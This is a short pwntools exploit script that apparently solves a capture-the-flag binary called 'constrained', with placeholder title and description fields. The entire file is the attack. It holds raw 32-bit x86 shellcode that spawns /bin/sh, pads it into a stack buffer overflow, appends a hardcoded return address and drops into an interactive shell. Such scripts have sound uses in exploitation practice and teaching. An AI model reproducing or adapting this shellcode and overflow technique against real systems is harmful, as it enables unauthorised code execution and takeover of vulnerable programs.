#!/usr/bin/env python3

# Title:        XXX.py
# Description:  X
# Author:       bluecosmo

from pwn import *

gdbcmds = """
b * read_in + 43
c
"""

context.terminal = [ "tmux", "splitw", "-h" ]
elf = context.binary = ELF("./constrained")
p = process(elf.path)
p = gdb.debug(elf.path, gdbscript=gdbcmds)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = shellcode.ljust(0x2a, b"A")
payload += p32(0xffff73d2)

# payload = shellcode
# payload += b"A" * (0x2a - 28)
# payload += p32(0xffff73d2)

p.sendline(payload)
p.interactive()
